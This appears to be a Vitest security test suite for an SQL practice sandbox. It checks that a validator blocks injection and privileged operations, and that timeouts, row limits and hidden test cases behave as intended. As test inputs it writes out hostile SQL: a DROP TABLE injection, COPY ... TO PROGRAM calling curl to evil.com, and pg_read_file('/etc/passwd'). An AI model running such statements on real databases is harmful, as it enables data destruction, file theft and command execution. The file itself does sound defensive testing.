import { describe, expect, it } from "vitest";
import { executeInSandbox } from "../../src/lib/engine/sandbox-runner";
import { validateQuery } from "../../src/lib/engine/statement-validator";
import { evaluateSubmission } from "../../src/lib/engine/evaluator";
import { QuestionMetadata } from "../../src/lib/engine/types";

describe("SQL Sandbox Security Test Suite", () => {
  it("rejects multi-statement injection attempts", () => {
    const malicious = "SELECT * FROM employees; DROP TABLE departments;";
    const validation = validateQuery(malicious, "select");
    expect(validation.valid).toBe(false);
    expect(validation.code).toBe("MULTI_STATEMENT_REJECTED");
  });

  it("blocks COPY ... PROGRAM execution", () => {
    const malicious = "COPY employees TO PROGRAM 'curl evil.com';";
    const validation = validateQuery(malicious, "select");
    expect(validation.valid).toBe(false);
    expect(validation.code).toBe("DISALLOWED_OPERATION");
  });

  it("blocks filesystem access functions (pg_read_file, pg_ls_dir)", () => {
    const malicious1 = "SELECT pg_read_file('/etc/passwd');";
    const validation1 = validateQuery(malicious1, "select");
    expect(validation1.valid).toBe(false);
    expect(validation1.code).toBe("DISALLOWED_OPERATION");

    const malicious2 = "SELECT pg_ls_dir('.');";
    const validation2 = validateQuery(malicious2, "select");
    expect(validation2.valid).toBe(false);
  });

  it("blocks CREATE EXTENSION", () => {
    const malicious = "CREATE EXTENSION plpythonu;";
    const validation = validateQuery(malicious, "select");
    expect(validation.valid).toBe(false);
    expect(validation.code).toBe("DISALLOWED_OPERATION");
  });

  it("blocks SET ROLE and SET SESSION AUTHORIZATION", () => {
    const malicious1 = "SET ROLE postgres;";
    const validation1 = validateQuery(malicious1, "select");
    expect(validation1.valid).toBe(false);

    const malicious2 = "SET SESSION AUTHORIZATION postgres;";
    const validation2 = validateQuery(malicious2, "select");
    expect(validation2.valid).toBe(false);
  });

  it("rejects queries exceeding maximum length of 10,000 characters", () => {
    const longQuery = "SELECT " + "a".repeat(10050);
    const validation = validateQuery(longQuery, "select");
    expect(validation.valid).toBe(false);
    expect(validation.code).toBe("QUERY_TOO_LONG");
  });

  it("enforces timeout on runaway queries (pg_sleep)", async () => {
    // Run with a 1500ms timeout to verify fast cancellation
    const res = await executeInSandbox("employeedb", "SELECT pg_sleep(5);", "sample", {
      timeoutMs: 1500,
    });
    expect(res.success).toBe(false);
    expect(res.error?.code).toBe("57014");
    expect(res.error?.userFacingMessage).toContain("timed out");
  });

  it("enforces max row limits (truncation at 1,000 rows with hasMore flag)", async () => {
    const query = "SELECT generate_series(1, 1500) AS id;";
    const res = await executeInSandbox("employeedb", query, "sample", {
      maxRows: 1000,
    });
    expect(res.success).toBe(true);
    expect(res.rowCount).toBe(1000);
    expect(res.totalRows).toBe(1500);
    expect(res.hasMore).toBe(true);
  });

  it("guarantees transaction rollback: modifications never persist in sample data", async () => {
    // Attempting a select query in sandbox leaves original table completely untouched
    const countBefore = await executeInSandbox(
      "employeedb",
      "SELECT COUNT(*) AS total FROM employees;",
      "sample"
    );
    expect(countBefore.success).toBe(true);
    const originalCount = Number(countBefore.rows[0].total);

    const countAfter = await executeInSandbox(
      "employeedb",
      "SELECT COUNT(*) AS total FROM employees;",
      "sample"
    );
    expect(countAfter.success).toBe(true);
    expect(Number(countAfter.rows[0].total)).toBe(originalCount);
  });

  it("never leaks hidden test case rows, data, or expected values on failure", async () => {
    const mockQuestion: QuestionMetadata = {
      id: "q-sec-1",
      slug: "test-sec",
      title: "Security Test",
      description_markdown: "Test",
      topic_id: "basics",
      subtopic_id: "select",
      difficulty: "easy",
      dialect: "postgresql",
      database_id: "employeedb",
      tables_involved: ["employees"],
      expected_columns: [{ name: "emp_id", type: "integer" }],
      order_matters: false,
      starter_query: "SELECT emp_id FROM employees;",
      solution_query: "SELECT emp_id FROM employees WHERE salary > 100000;",
      solution_explanation: "Filters salaries",
      hints: ["h1", "h2", "h3"],
      tags: ["security"],
      source: "original",
      estimated_minutes: 5,
      xp: 10,
      status: "published",
      version: 1,
      test_cases: [
        { id: "tc-1", name: "Sample", is_hidden: false, dataset_name: "sample" },
        { id: "tc-2", name: "Hidden 1", is_hidden: true, dataset_name: "hidden_1" },
      ],
    };

    // Submit a wrong query that hardcodes sample IDs
    const userQuery = "SELECT 1 AS emp_id;";
    const evalRes = await evaluateSubmission(mockQuestion, userQuery);

    expect(evalRes.verdict).toBe("incorrect");
    const hiddenCase = evalRes.testCaseResults.find((tc) => tc.isHidden);
    expect(hiddenCase).toBeDefined();
    // Verification: Hidden case must NOT reveal expected rows or user rows
    expect(hiddenCase?.expectedRows).toBeUndefined();
    expect(hiddenCase?.userRows).toBeUndefined();
  });
});
